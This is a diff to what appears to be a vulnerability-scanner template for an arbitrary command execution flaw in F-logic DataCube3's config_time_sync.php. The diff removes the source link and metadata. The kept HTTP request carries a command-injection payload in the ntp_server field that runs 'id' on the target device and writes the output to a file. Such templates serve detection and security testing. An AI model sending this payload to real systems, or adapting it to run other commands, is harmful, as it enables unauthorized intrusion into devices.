@@ -3,12 +3,8 @@ info:
   name: F-logic DataCube3 config_time_sync.php 任意命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uusm4drf58eergzg'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uusm4drf58eergzg
-    fofa: 暂无
 http:
 - raw:
   - 'POST /admin/config_time_sync.php HTTP/1.1
@@ -36,8 +32,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     accesstime=0.85628800 1710984011&execute=&ntp_enable=&ntp_server=127.0.0.1|id >dudesite.txt|&
